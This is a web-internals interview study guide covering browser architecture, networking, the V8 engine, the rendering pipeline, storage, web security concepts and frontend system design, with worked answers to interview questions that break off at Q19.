# 🌐 Web Internals Roadmap (Interview-Oriented)

*A comprehensive guide from fundamentals to advanced concepts for mastering web internals interviews*

---

## 1. Browser Architecture & Process Model

### Core Concepts

**Multi-process Architecture**
- Browser process (UI, bookmarks, navigation)
- Renderer process (per-tab isolation, parsing, layout, JavaScript execution)
- GPU process (hardware acceleration, compositing)
- Network process (requests, caching, service workers)
- Plugin process (isolated third-party plugins)

**Site Isolation & Security**
- Out-of-process iframes (OOPIF)
- Process-per-site vs process-per-site-instance
- Cross-origin read blocking (CORB)
- Spectre/Meltdown mitigations

**Inter-process Communication**
- Mojo IPC system
- Shared memory regions
- Message passing patterns

### Interview Questions

- Why does Chrome use separate processes for each tab?
- What triggers spawning a new renderer process?
- How does site isolation protect against cross-origin attacks?
- What are the memory vs security tradeoffs in multi-process architecture?

---

## 2. Navigation & Network Stack

### Request Lifecycle

**DNS Resolution**
- Recursive vs iterative queries
- DNS caching (browser, OS, router)
- DNS prefetching strategies
- DNS over HTTPS (DoH)

**Connection Establishment**
- TCP 3-way handshake (SYN, SYN-ACK, ACK)
- TLS 1.2 vs TLS 1.3 handshake
- Session resumption & 0-RTT
- ALPN (Application-Layer Protocol Negotiation)

**HTTP Evolution**
- HTTP/1.1: pipelining, persistent connections
- HTTP/2: multiplexing, header compression (HPACK), server push
- HTTP/3: QUIC, UDP-based, improved head-of-line blocking
- Performance characteristics of each version

### Caching Architecture

**Multi-layer Cache Strategy**
- Memory cache (fastest, volatile)
- Disk cache (persistent, larger capacity)
- Service Worker cache (programmable, offline-first)
- CDN edge cache (geographically distributed)

**Cache Control Mechanisms**
- Cache-Control directives (max-age, no-cache, no-store, immutable)
- ETag validation
- Conditional requests (If-None-Match, If-Modified-Since)
- Stale-while-revalidate patterns

**Resource Prioritization**
- Chrome's network priority model
- Resource hints (preconnect, prefetch, preload, dns-prefetch)
- Critical request chains
- Resource loading order (CSS → fonts → images → deferred scripts)

### Interview Questions

- Explain the complete flow from typing a URL to seeing content
- How does HTTP/2 multiplexing solve head-of-line blocking? What about HTTP/3?
- When would a browser serve from cache vs make a network request?
- What's the difference between preload, prefetch, and preconnect?
- How does connection keep-alive improve performance?

---

## 3. JavaScript Engine (V8 Deep Dive)

### Execution Pipeline

**Parsing & Compilation**
- Scanner → tokens
- Parser → Abstract Syntax Tree (AST)
- Ignition interpreter → bytecode
- TurboFan JIT compiler → optimized machine code
- Lazy parsing and compilation strategies
- Streaming compilation for large scripts

**Optimization Techniques**
- Hidden classes (fast property access)
- Inline caching (monomorphic, polymorphic, megamorphic)
- Speculation and deoptimization
- Escape analysis
- Function inlining

**Memory Management**
- Heap organization (young/old generation)
- Stack vs heap allocation
- Garbage collection algorithms:
  - Minor GC (Scavenger for young generation)
  - Major GC (Mark-sweep-compact for old generation)
  - Incremental marking
  - Concurrent and parallel GC
- Memory leaks: common patterns and detection

### Event Loop Architecture

**Task Queues**
- Call stack
- Macrotask queue (setTimeout, setInterval, I/O)
- Microtask queue (Promises, queueMicrotask, MutationObserver)
- Animation frame callbacks
- Idle callbacks

**Execution Model**
- How promises are scheduled
- Async/await implementation (state machines)
- Job queue processing order
- Event loop phases in Node.js vs browser

### Interview Questions

- Explain the event loop with microtasks and macrotasks
- What are hidden classes and why are they important?
- Why does changing object shape cause performance issues?
- How does garbage collection impact application performance?
- What happens when TurboFan deoptimizes code?
- Order of execution: setTimeout vs Promise.then vs requestAnimationFrame

---

## 4. Rendering Pipeline

### Critical Rendering Path

**DOM Construction**
- HTML parsing (tokenization → tree construction)
- Incremental parsing
- Script blocking behavior
- Defer vs async vs module scripts

**CSSOM Construction**
- CSS parsing and cascade
- Specificity calculation
- Style computation (inherited, computed, used values)
- CSS blocking behavior

**Render Tree Construction**
- Combining DOM + CSSOM
- Excluding non-visual elements (display: none, <script>, <meta>)
- Creating render objects

**Layout (Reflow)**
- Box model calculations
- Flow vs flexbox vs grid layout algorithms
- Containing block concept
- Layout thrashing and forced synchronous layout
- Layout scope (global vs incremental)

**Paint**
- Paint order (background → borders → content → outlines)
- Paint invalidation
- Paint areas vs paint records
- Dirty rectangles

**Compositing**
- Layer promotion criteria (will-change, transforms, fixed positioning)
- Main thread vs compositor thread
- Hardware acceleration (GPU)
- Transform and opacity optimizations
- Layer squashing

### Performance Optimization

**Reflow vs Repaint**
- Properties that trigger reflow (width, height, top, left)
- Properties that trigger repaint only (color, background, visibility)
- Properties that trigger composite only (transform, opacity)

**Jank Prevention**
- 60fps target (16.67ms per frame)
- Long tasks (>50ms)
- Input latency
- Layout shift avoidance

### Interview Questions

- Explain the complete rendering pipeline from HTML to pixels
- What's the difference between layout, paint, and composite?
- Why is `transform` more performant than `top/left` for animations?
- What causes layout thrashing and how do you avoid it?
- When does the browser create a new layer?
- Why is reading `offsetHeight` after setting `width` expensive?

---

## 5. Critical Rendering Path Optimization

### Render Blocking Analysis

**CSS Blocking**
- Why CSS blocks rendering
- Media queries and conditional loading
- Critical CSS extraction
- CSS containment

**JavaScript Blocking**
- Parser blocking scripts
- `defer` attribute: execution after parsing, maintains order
- `async` attribute: execution when ready, no order guarantee
- `type="module"`: deferred by default, dependency resolution

### Resource Loading Strategies

**Resource Hints**
- `dns-prefetch`: resolve domain early
- `preconnect`: establish connection (DNS + TCP + TLS)
- `prefetch`: low-priority fetch for future navigation
- `preload`: high-priority fetch for current page (as="style|script|font")
- `modulepreload`: preload ES modules with dependencies

**Code Splitting**
- Route-based splitting
- Component-based lazy loading
- Dynamic imports
- Webpack chunks
- Tree-shaking dead code

**Image Optimization**
- Modern formats (WebP, AVIF, JPEG XL)
- Responsive images (srcset, sizes, picture element)
- Lazy loading (loading="lazy")
- Placeholder strategies (blur-up, LQIP)
- CDN transformations

### Core Web Vitals

**LCP (Largest Contentful Paint)**
- Target: <2.5s
- Optimize: server response, resource load time, client rendering

**FID/INP (First Input Delay / Interaction to Next Paint)**
- Target: FID <100ms, INP <200ms
- Optimize: reduce JS execution, break up long tasks

**CLS (Cumulative Layout Shift)**
- Target: <0.1
- Optimize: size attributes, font loading, dynamic content

### Interview Questions

- Why is CSS render-blocking and how can you optimize it?
- When should you use defer vs async vs module?
- Explain the difference between preload and prefetch
- How do you identify and fix high TTI (Time to Interactive)?
- What strategies reduce LCP in a React application?

---

## 6. Web Storage & State Management

### Storage Mechanisms

**Cookies**
- Size limit: 4KB per cookie
- Attributes: Domain, Path, Expires, Max-Age, Secure, HttpOnly, SameSite
- Sent with every request (performance impact)
- Use cases: session management, authentication

**LocalStorage**
- Size: ~5-10MB
- Synchronous API (blocking)
- Persists indefinitely
- Same-origin only
- Not accessible from workers

**SessionStorage**
- Size: ~5-10MB
- Tab-scoped
- Cleared on tab close
- Synchronous API

**IndexedDB**
- Size: unlimited (quota-based)
- Asynchronous (Promise-based)
- NoSQL key-value store
- Supports indexes, transactions
- Accessible from workers
- Best for large datasets

**Cache API**
- Part of Service Worker API
- Request/Response pairs
- Programmatic control
- Used for offline strategies

### Storage Quotas & Eviction

- Best effort vs persistent storage
- Quota calculation (% of disk space)
- LRU eviction policies
- Storage estimation API

### Interview Questions

- Why is LocalStorage not recommended for production apps?
- When should you use IndexedDB vs LocalStorage?
- What's the difference between Cache API and browser cache?
- Explain cookie security attributes (HttpOnly, Secure, SameSite)
- How do storage quotas work across different origins?

---

## 7. Web Security Fundamentals

### Same-Origin Policy (SOP)

**Origin Definition**
- Protocol + Domain + Port
- Why SOP exists (isolation of trust boundaries)
- What SOP restricts: DOM access, cookies, storage, network requests

### Cross-Origin Resource Sharing (CORS)

**Request Types**
- Simple requests (GET, POST, HEAD with simple headers)
- Preflight requests (OPTIONS) for complex requests
- Credentialed requests

**Headers**
- Request: Origin, Access-Control-Request-Method/Headers
- Response: Access-Control-Allow-Origin/Methods/Headers/Credentials

**Common Scenarios**
- API calls from different domains
- Font loading
- Canvas image manipulation

### Cross-Site Scripting (XSS)

**Types**
- Reflected XSS (URL-based)
- Stored XSS (database-persisted)
- DOM-based XSS (client-side)

**Prevention**
- Input validation and sanitization
- Output encoding
- Content Security Policy (CSP)
- Trusted Types API
- HTTPOnly cookies

### Content Security Policy (CSP)

**Directives**
- `default-src`, `script-src`, `style-src`, `img-src`
- `nonce` and `hash` for inline scripts
- `unsafe-inline`, `unsafe-eval` (avoid)
- Report-only mode for testing

### Cross-Site Request Forgery (CSRF)

**Attack Vector**
- Leveraging authenticated sessions
- State-changing requests from malicious sites

**Prevention**
- CSRF tokens (synchronizer tokens)
- SameSite cookies
- Origin/Referer header validation
- Double-submit cookies

### HTTPS & Transport Security

**TLS/SSL**
- Encryption in transit
- Certificate validation
- Perfect Forward Secrecy (PFS)

**HSTS (HTTP Strict Transport Security)**
- Force HTTPS for domain
- Preload lists
- Prevents downgrade attacks

### Interview Questions

- Explain Same-Origin Policy and why it exists
- When does a CORS preflight request occur?
- How does CSP mitigate XSS attacks?
- What's the difference between XSS and CSRF?
- Why should cookies be HttpOnly and SameSite?
- How does HSTS prevent man-in-the-middle attacks?

---

## 8. Modern Web APIs

### Web Workers

**Types**
- Dedicated Workers (one-to-one with page)
- Shared Workers (multiple pages)
- Service Workers (network proxy, offline)

**Communication**
- postMessage API
- Structured clone algorithm
- Transferable objects (ArrayBuffer, MessagePort)
- SharedArrayBuffer + Atomics

**Use Cases**
- Heavy computations off main thread
- Image processing
- Data parsing
- Background synchronization

### Service Workers & PWAs

**Lifecycle**
- Registration → Installation → Activation → Fetch/Message
- Update mechanism
- Waiting state and skipWaiting()

**Caching Strategies**
- Cache-first (offline-first)
- Network-first (online-first)
- Stale-while-revalidate
- Network-only / Cache-only

**PWA Features**
- Web App Manifest
- Add to home screen
- Background sync
- Push notifications
- Offline functionality

### WebAssembly (WASM)

**Overview**
- Binary instruction format
- Near-native performance
- Language-agnostic (C/C++/Rust compiled to WASM)

**Use Cases**
- Game engines
- Video/image codecs
- Cryptography
- ML inference

**Integration**
- Loading and instantiating modules
- JS ↔ WASM interop
- Linear memory model
- SIMD operations

### Worklets

**Types**
- Paint Worklet (custom rendering)
- Animation Worklet (off-thread animations)
- Audio Worklet (custom audio processing)
- Layout Worklet (experimental custom layouts)

### Interview Questions

- When should you use Web Workers?
- Explain the Service Worker lifecycle
- What's the difference between transferable and structured clone?
- How does offline-first caching work?
- Why do Service Workers require HTTPS?
- What problems does WebAssembly solve?

---

## 9. Browser Scheduling & Performance

### Task Scheduling APIs

**requestAnimationFrame**
- Synchronized with display refresh rate
- ~60fps (16.67ms intervals)
- Use for visual updates

**requestIdleCallback**
- Runs during browser idle time
- Timeout parameter for max wait
- Use for non-critical work

**Scheduler API (proposed)**
- postTask with priorities
- User-blocking, user-visible, background

### Performance Monitoring

**Performance API**
- Navigation Timing
- Resource Timing
- User Timing (mark/measure)
- Paint Timing
- Long Tasks API

**Observer APIs**
- PerformanceObserver
- IntersectionObserver
- MutationObserver
- ResizeObserver

### Long Task Management

**Identification**
- Tasks >50ms
- Total Blocking Time (TBT)
- Input latency impact

**Mitigation**
- Task splitting (yield to main thread)
- Web Workers for heavy computation
- Code splitting and lazy loading
- Debouncing and throttling

### Interview Questions

- When should you use requestAnimationFrame vs setTimeout?
- How does requestIdleCallback help performance?
- What is Total Blocking Time and why does it matter?
- How do you break up long JavaScript tasks?
- Explain the difference between debouncing and throttling

---

## 10. Advanced Performance Optimization

### Measuring Performance

**Network Waterfall Analysis**
- Identify blocking resources
- Analyze request chains
- Find long-running requests
- Detect redundant requests

**Runtime Performance**
- Chrome DevTools Performance panel
- Flame charts and call trees
- Frame timing analysis
- Memory profiling

**Real User Monitoring (RUM)**
- Field data vs lab data
- Core Web Vitals tracking
- Error tracking
- Performance budgets

### Optimization Techniques

**Network**
- HTTP/2 server push
- Early hints (103 status code)
- Resource bundling vs unbundling
- Compression (gzip, brotli)

**Rendering**
- Eliminate layout thrashing
- Virtualization (windowing large lists)
- Content-visibility CSS property
- CSS containment

**JavaScript**
- Code splitting by route
- Tree shaking unused code
- Lazy hydration
- Partial hydration
- Islands architecture

**Images**
- Responsive images
- Art direction with picture element
- Lazy loading with IntersectionObserver
- Progressive image formats
- Image CDN optimizations

### Memory Management

**Memory Leaks**
- Detached DOM nodes
- Event listener accumulation
- Global references
- Closure traps
- Timer/interval cleanup

**Detection**
- Heap snapshots
- Allocation timeline
- Detached node investigation

### Interview Questions

- How do you optimize a slow page given a waterfall chart?
- What causes memory leaks in JavaScript applications?
- Explain layout thrashing and how to prevent it
- How do you measure and improve Core Web Vitals?
- What's the difference between debouncing and throttling?

---

## 11. Modern Web Architecture

### Rendering Patterns

**Client-Side Rendering (CSR)**
- Pros: rich interactivity, SPA experience
- Cons: slower FCP, SEO challenges

**Server-Side Rendering (SSR)**
- Pros: fast FCP, SEO friendly
- Cons: slower TTI, server load

**Static Site Generation (SSG)**
- Pre-rendered at build time
- CDN-friendly
- Limited dynamic content

**Incremental Static Regeneration (ISR)**
- Revalidate static pages periodically
- Balance static + dynamic

**React Server Components (RSC)**
- Server-only components
- Zero bundle size for server components
- Automatic code splitting

### Edge Computing

**Edge Functions**
- Cloudflare Workers
- Vercel Edge Functions
- CDN-based compute

**Benefits**
- Reduced latency (geographically close)
- Dynamic content at edge
- Personalization without origin round-trip

### Micro-frontends

**Approaches**
- Build-time integration
- Server-side integration
- Client-side integration (runtime)
- Module Federation (Webpack 5)

**Challenges**
- Shared dependencies
- Routing coordination
- State management
- Performance overhead

### Interview Questions

- Compare CSR, SSR, and SSG - when to use each?
- What are React Server Components and what problems do they solve?
- How does edge computing improve performance?
- What are the tradeoffs of micro-frontends?

---

## 12. System Design for Frontend

### Real-time Systems

**WebSockets**
- Full-duplex bidirectional communication
- Persistent connection
- Use cases: chat, live updates, gaming

**Server-Sent Events (SSE)**
- Unidirectional (server → client)
- Auto-reconnection
- Event stream protocol
- Use cases: notifications, live feeds

**HTTP/2 Server Push**
- Proactive resource delivery
- Cache awareness issues
- Less common than expected

**Polling Strategies**
- Short polling (repeated requests)
- Long polling (held connections)
- Tradeoffs vs WebSockets

### Large-Scale Features

**Infinite Scroll / Feed**
- Virtualization (react-window, react-virtuoso)
- Cursor-based pagination
- Optimistic updates
- Skeleton screens

**Image Upload & Processing**
- Client-side preview
- Chunked uploads for large files
- Presigned URLs (S3)
- Image optimization pipeline
- Progress tracking

**Notification System**
- Push API and Service Workers
- Permission management
- Notification queue
- Read/unread state sync

**Search & Autocomplete**
- Debouncing user input
- Client-side caching
- Server-side indexing
- Fuzzy matching
- Result ranking

### Scalability Patterns

**CDN Strategy**
- Static asset distribution
- Cache invalidation techniques
- Versioned URLs
- Cache-Control headers

**State Management**
- Client state vs server state
- Optimistic updates
- Cache invalidation
- Real-time synchronization

**Performance at Scale**
- Code splitting strategies
- Lazy loading patterns
- Bundle size budgets
- Third-party script management

### Interview Questions

- Design a real-time chat application
- How would you implement infinite scroll efficiently?
- Design an image upload system for large files
- How would you implement a notification system?
- WebSockets vs Server-Sent Events - when to use each?

---

## 13. Must-Know Interview Questions

### Conceptual Deep Dives

1. **What happens when you type a URL in the browser?**
   - Complete flow: DNS → TCP → TLS → HTTP → Parse → Render → Paint → Composite

2. **Why do browsers use multi-process architecture?**
   - Stability, security, parallelism, site isolation

3. **Explain the event loop and microtask queue**
   - Call stack, macrotasks, microtasks, execution order

4. **What makes CSS render-blocking?**
   - Must construct CSSOM before rendering, blocks paint

5. **How do browsers create and composite layers?**
   - Layer promotion criteria, main thread vs compositor thread

6. **How does HTTP/2 solve head-of-line blocking?**
   - Multiplexing, but TCP-level HOL still exists (fixed in HTTP/3/QUIC)

7. **Why do long JavaScript tasks freeze the UI?**
   - Single-threaded main thread, blocks rendering pipeline

8. **How does the browser decide to repaint a region?**
   - Dirty rectangle tracking, paint invalidation, optimization heuristics

### Debugging & Optimization

9. **Optimize a slow page given a waterfall chart**
   - Identify render-blocking, long requests, request chains, prioritization issues

10. **How does TLS handshake work?**
    - ClientHello → ServerHello → Certificate → Key exchange → Finished

11. **Why are cookies HttpOnly?**
    - Prevent XSS access to session tokens

12. **Explain CORS preflight**
    - OPTIONS request for non-simple requests, checks permissions before actual request

13. **How to secure a web app from XSS?**
    - Input sanitization, output encoding, CSP, Trusted Types, HttpOnly cookies

14. **Prefetch vs preload vs dns-prefetch vs preconnect?**
    - Different priority levels and purposes in resource loading

### Advanced Topics

15. **Difference between reflow, repaint, and composite?**
    - Reflow (layout), repaint (pixels), composite (layers to screen)

16. **Why is object shape stability important in V8?**
    - Hidden classes, inline caching, deoptimization costs

17. **How does garbage collection work and impact performance?**
    - Generational GC, pause times, incremental marking

18. **When should you use Web Workers?**
    - Heavy computation, parsing, crypto - anything that blocks main thread

19. **Explain Service Worker caching strategies**
    - Cache-first, network-first, stale-while-revalidate patterns

20. **How does HTTP/3 improve on HTTP/2?**
    - QUIC protocol, UDP-based, eliminates TCP head-of-line blocking

---

## Study Strategy

### Priority Levels

**Must Know (Interview Essentials)**
- Browser rendering pipeline
- Event loop & JavaScript execution
- Network stack (DNS, TCP, HTTP versions)
- CORS & security basics
- Performance optimization fundamentals

**Should Know (Senior Level)**
- Multi-process architecture
- V8 internals and optimization
- Service Workers & PWAs
- Advanced caching strategies
- System design patterns

**Nice to Know (Staff/Principal)**
- WebAssembly integration
- Edge computing architecture
- Micro-frontend patterns
- Browser scheduling internals
- Advanced security (CSP, Trusted Types)

### Practice Approach

1. **Build mental models** - visualize the complete flow
2. **Trace real scenarios** - walk through actual page loads
3. **Measure everything** - use Chrome DevTools extensively
4. **Explain simply** - can you explain to a non-technical person?
5. **Connect concepts** - how do pieces fit together?

### Resources

- Chrome DevTools documentation
- web.dev (Google's web fundamentals)
- MDN Web Docs
- V8 blog
- Performance testing (WebPageTest, Lighthouse)

---

# 🌐 Web Internals: 50 Essential Interview Questions

*Complete answers for browser architecture, rendering, JavaScript engines, and security*

---

## 1. Browser Architecture & Networking (15 Questions)

### Q1: What happens when you type a URL and press Enter?

**Complete Flow:**

1. **DNS Lookup** - Domain name resolved to IP address
2. **TCP Handshake** - 3-way handshake (SYN, SYN-ACK, ACK)
3. **TLS Handshake** - Establish encrypted connection
4. **HTTP Request** - Browser sends GET request
5. **Server Response** - HTML document returned
6. **HTML Parsing** - Browser tokenizes and builds DOM tree
7. **Resource Discovery** - CSS, JS, images identified and requested
8. **CSSOM Construction** - CSS parsed into CSSOM tree
9. **Render Tree** - DOM + CSSOM combined (excluding non-visual elements)
10. **Layout** - Calculate positions and dimensions
11. **Paint** - Rasterize visual elements into layers
12. **Composite** - Combine layers using GPU
13. **Display** - Pixels rendered to screen

---

### Q2: What is DNS, and why is it slow?

**DNS (Domain Name System)** resolves human-readable domain names to IP addresses.

**Why it's slow:**
- Requires multiple round trips across DNS hierarchy (root → TLD → authoritative)
- Recursive lookups involve multiple server queries
- Network latency for each hop
- No cached result on first visit

**Solutions:**
- DNS prefetch: `<link rel="dns-prefetch" href="//example.com">`
- DNS caching at browser/OS/router level
- CDNs with globally distributed DNS servers
- DNS over HTTPS (DoH) for security

---

### Q3: Difference between HTTP/1.1, HTTP/2, and HTTP/3?

| Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---------|----------|---------|---------|
| **Protocol** | Text-based | Binary framing | Binary over QUIC |
| **Connection** | One request per connection | Multiplexed streams | Multiplexed over UDP |
| **HOL Blocking** | Yes (TCP level) | Partially (TCP level remains) | No (QUIC solves it) |
| **Header Compression** | No | Yes (HPACK) | Yes (QPACK) |
| **Server Push** | No | Yes | Yes |
| **Handshake** | TCP + TLS (2-3 RTT) | TCP + TLS (2-3 RTT) | Combined QUIC (1 RTT) |
| **Loss Recovery** | TCP retransmits all | TCP retransmits all | QUIC retransmits only lost streams |

**Key Takeaway:**
- HTTP/1.1: Sequential, slow, head-of-line blocking
- HTTP/2: Multiplexing over single TCP connection (but TCP HOL remains)
- HTTP/3: Uses QUIC over UDP, eliminates all HOL blocking

---

### Q4: What causes head-of-line (HOL) blocking?

**Definition:** When one blocked request/packet prevents others from being processed.

**HTTP/1.1 Request-Level HOL:**
- Only one request per TCP connection
- Subsequent requests must wait for previous to complete
- Solution: HTTP/2 multiplexing

**TCP Packet-Level HOL (affects HTTP/2):**
- TCP guarantees ordered delivery
- If one packet is lost, all subsequent packets wait (even from different streams)
- Solution: HTTP/3 with QUIC (UDP-based, independent streams)

**Example:**
```
TCP: [Packet 1 LOST] [Packet 2] [Packet 3]
     All packets 2 & 3 blocked waiting for retransmit of Packet 1

QUIC: [Stream A - Packet 1 LOST] [Stream B - Packet 1 ✓]
      Stream B proceeds independently while Stream A retransmits
```

---

### Q5: What is TLS handshake?

**Purpose:** Establish encrypted connection and negotiate cipher suites.

**TLS 1.2 Handshake (2 RTT):**
1. **ClientHello** - Client sends supported ciphers, TLS version
2. **ServerHello** - Server chooses cipher, sends certificate
3. **Certificate Validation** - Client verifies certificate chain
4. **Key Exchange** - Diffie-Hellman or RSA key exchange
5. **Finished** - Both sides confirm encryption is working
6. **Encrypted Communication** begins

**TLS 1.3 Improvements (1 RTT):**
- Combined key exchange with ClientHello
- Removed weak ciphers
- 0-RTT resumption for repeat connections

---

### Q6: Why is TCP slow on first request?

**Multiple Round Trips Required:**

1. **DNS Lookup** - 1 RTT (if not cached)
2. **TCP Handshake** - 1 RTT (SYN, SYN-ACK, ACK)
3. **TLS Handshake** - 1-2 RTT (certificate exchange, key negotiation)

**Total:** 3-4 RTT before first byte of data

**Cold Start Penalty:**
- High latency multiplied by RTT count
- 200ms latency × 4 RTT = 800ms before data transfer begins

**Optimizations:**
- Connection reuse (keep-alive)
- TLS session resumption
- TCP Fast Open
- QUIC's combined handshake (HTTP/3)

---

### Q7: What is preconnect and when is it used?

**Definition:** `<link rel="preconnect">` instructs browser to establish early connection to a domain.

**What it does:**
- DNS resolution
- TCP handshake
- TLS negotiation

**When to use:**
- Critical third-party resources (fonts, APIs)
- Resources loaded later in page lifecycle
- Known future navigations

**Example:**
```html
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://api.example.com">
```

**Trade-off:** Uses bandwidth and connection slots, so limit to ~3 critical domains.

---

### Q8: Difference between preload and prefetch?

| Feature | Preload | Prefetch |
|---------|---------|----------|
| **Priority** | High | Low |
| **Timing** | Current page | Future navigation |
| **Cache** | Yes | Yes |
| **Use Case** | Critical resources below-the-fold | Next page resources |
| **Attribute** | `<link rel="preload">` | `<link rel="prefetch">` |

**Preload Example:**
```html
<!-- Font needed but discovered late -->
<link rel="preload" href="font.woff2" as="font" crossorigin>

<!-- Critical hero image -->
<link rel="preload" href="hero.jpg" as="image">
```

**Prefetch Example:**
```html
<!-- Next page JavaScript -->
<link rel="prefetch" href="/page2-bundle.js">

<!-- Likely user navigation -->
<link rel="prefetch" href="/products.html">
```

---

### Q9: Why is CSS render-blocking?

**Core Reason:** Browser cannot render page until CSSOM (CSS Object Model) is built.

**Why CSSOM is required:**
- Layout calculations need final computed styles
- Browser must know which styles apply to which elements
- Cannot paint without knowing colors, sizes, positions

**Render Tree Formula:**
```
DOM + CSSOM = Render Tree
```

**Optimization Strategies:**
1. **Critical CSS** - Inline above-the-fold styles
2. **Media Queries** - Non-blocking for print, mobile
   ```html
   <link rel="stylesheet" href="print.css" media="print">
   ```
3. **Async CSS Loading** - Use JavaScript to load non-critical CSS
4. **Reduce CSS Size** - Remove unused styles, minify

---

### Q10: What is CORS?

**CORS (Cross-Origin Resource Sharing)** - Browser security mechanism that controls cross-origin HTTP requests.

**Same-Origin Policy:**
- Protocol + Domain + Port must match
- Prevents malicious sites from reading sensitive data

**CORS Headers:**
```http
# Server Response
Access-Control-Allow-Origin: https://trusted-site.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

**Simple Request (no preflight):**
- Methods: GET, HEAD, POST
- Headers: Accept, Accept-Language, Content-Language, Content-Type (limited)

**Complex Request (requires preflight):**
- Custom headers
- Methods: PUT, DELETE, PATCH
- Content-Type: application/json

---

### Q11: What triggers a CORS preflight?

**Preflight** = OPTIONS request sent before actual request to check permissions.

**Triggers:**

1. **HTTP Methods:** PUT, DELETE, PATCH, CONNECT, OPTIONS, TRACE
2. **Custom Headers:** Any header not in CORS-safelisted set
3. **Content-Type:** `application/json`, `text/xml`, anything except:
   - `application/x-www-form-urlencoded`
   - `multipart/form-data`
   - `text/plain`
4. **Credentials:** `credentials: 'include'` with custom headers

**Preflight Flow:**
```http
# Browser sends OPTIONS
OPTIONS /api/data HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, X-Custom-Header

# Server responds
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Content-Type, X-Custom-Header
Access-Control-Max-Age: 86400

# Then actual request proceeds
```

---

### Q12: How does browser cache decide HIT vs MISS?

**Cache Decision Flow:**

1. **Check Cache-Control header**
   ```http
   Cache-Control: max-age=3600          # Cache for 1 hour
   Cache-Control: no-cache              # Revalidate every time
   Cache-Control: no-store              # Never cache
   Cache-Control: public, max-age=31536000  # Cache 1 year (immutable)
   ```

2. **Calculate Freshness**
   - If `max-age` not exceeded → **CACHE HIT**
   - If expired → check `ETag` or `Last-Modified`

3. **Revalidation (if expired)**
   ```http
   # Browser sends
   If-None-Match: "33a64df551425fcc55e4d42a148795d9"
   
   # Server responds
   304 Not Modified  → CACHE HIT (use stale version)
   200 OK           → CACHE MISS (download new version)
   ```

**Cache Hierarchy:**
1. Memory cache (fastest, cleared on tab close)
2. Disk cache (persistent)
3. Service Worker cache (programmable)

---

### Q13: What is a service worker?

**Service Worker** = Programmable network proxy that runs in background thread.

**Capabilities:**
- Intercept and modify network requests
- Cache resources for offline access
- Background sync
- Push notifications
- Periodic background sync

**Lifecycle:**
```javascript
// 1. Registration
navigator.serviceWorker.register('/sw.js');

// 2. Installation
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('v1').then(cache => cache.addAll(['/']))
  );
});

// 3. Activation
self.addEventListener('activate', (event) => {
  // Clean up old caches
});

// 4. Fetch interception
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request)
      .then(response => response || fetch(event.request))
  );
});
```

---

### Q14: Why must service workers run on HTTPS?

**Security Reasons:**

1. **Powerful Capabilities**
   - Can intercept ALL network requests
   - Can modify responses
   - Can inject content

2. **MITM Attack Prevention**
   - Without HTTPS, attacker could inject malicious service worker
   - Would persist and control all future requests

3. **Trust Boundary**
   - HTTPS ensures service worker code integrity
   - Certificate validation proves origin authenticity

**Exception:** `localhost` allowed for development.

---

### Q15: Explain SameSite cookies.

**SameSite** attribute controls when cookies are sent in cross-site requests.

**Values:**

1. **Strict** - Never sent in cross-site requests
   ```http
   Set-Cookie: session=abc123; SameSite=Strict
   ```
   - Clicking link from email → cookie NOT sent
   - Direct navigation only

2. **Lax** (default) - Sent only on "safe" cross-site requests
   - Top-level navigation (GET) → cookie sent
   - Iframe, AJAX, POST → cookie NOT sent

3. **None** - Always sent (requires Secure)
   ```http
   Set-Cookie: tracking=xyz; SameSite=None; Secure
   ```
   - Third-party cookies (ads, analytics)
   - Must use HTTPS

**CSRF Protection:**
```http
# Login cookie should be Strict or Lax
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
```

---

## 2. Rendering Pipeline & Performance (15 Questions)

### Q16: What is Critical Rendering Path?

**Definition:** Sequence of steps browser takes to convert HTML/CSS/JS into pixels.

**Complete Pipeline:**

```
HTML → DOM Tree
CSS → CSSOM Tree
       ↓
   Render Tree (DOM + CSSOM, excludes display:none)
       ↓
   Layout (calculate geometry)
       ↓
   Paint (rasterize to layers)
       ↓
   Composite (combine layers on GPU)
       ↓
   Display
```

**Optimization Goals:**
- Minimize critical resources (CSS, fonts, blocking JS)
- Minimize critical bytes (file sizes)
- Minimize critical path length (RTT count)

---

### Q17: What is a reflow (layout) vs repaint?

**Reflow (Layout):**
- **Recalculates** positions and dimensions of elements
- **Expensive** - affects entire render tree
- **Triggered by:** width, height, margin, padding, position, display, float

**Repaint:**
- **Redraws** pixels without changing layout
- **Less expensive** than reflow
- **Triggered by:** color, background, visibility, outline, box-shadow

**Composite-Only Change:**
- **Cheapest** - no layout or paint needed
- **Triggered by:** transform, opacity (on composited layer)

**Performance Hierarchy:**
```
Composite-only (GPU)  ← Fastest
    ↑
Repaint (CPU)
    ↑
Reflow (CPU)          ← Slowest
```

**Example:**
```javascript
// ❌ BAD - Causes reflow
element.style.width = '100px';
element.style.height = '100px';

// ✅ GOOD - Single reflow
element.className = 'new-size';  // CSS: .new-size { width: 100px; height: 100px; }

// ✅ BEST - Composite-only
element.style.transform = 'scale(1.5)';
```

---

### Q18: What triggers layout thrashing?

**Layout Thrashing** = Forced synchronous layout caused by reading layout properties immediately after writing.

**The Problem:**
```javascript
// ❌ BAD - Causes layout thrashing
for (let i = 0; i < 100; i++) {
  element.style.width = `${element.offsetWidth + 10}px`;  // Read → Write
  // Forces layout recalculation on EVERY iteration
}
```

**Why it happens:**
1. Write operation (style.width) invalidates layout
2. Read operation (offsetWidth) forces immediate recalculation
3. Browser cannot batch optimizations

**Solution - Batch reads, then writes:**
```javascript
// ✅ GOOD - Batch reads first
const widths = [];
for (let i = 0; i < 100; i++) {
  widths.push(elements[i].offsetWidth);  // All reads first
}

// Then batch writes
requestAnimationFrame(() => {
  for (let i = 0; i < 100; i++) {
    elements[i].style.width = `${widths[i] + 10}px`;  // All writes
  }
});
```

**Properties that force layout:**
- offsetWidth/Height, clientWidth/Height, scrollWidth/Height
- getComputedStyle(), getBoundingClientRect()

---

### Q19: Why are transformations (translate, scale, opacity) fast?

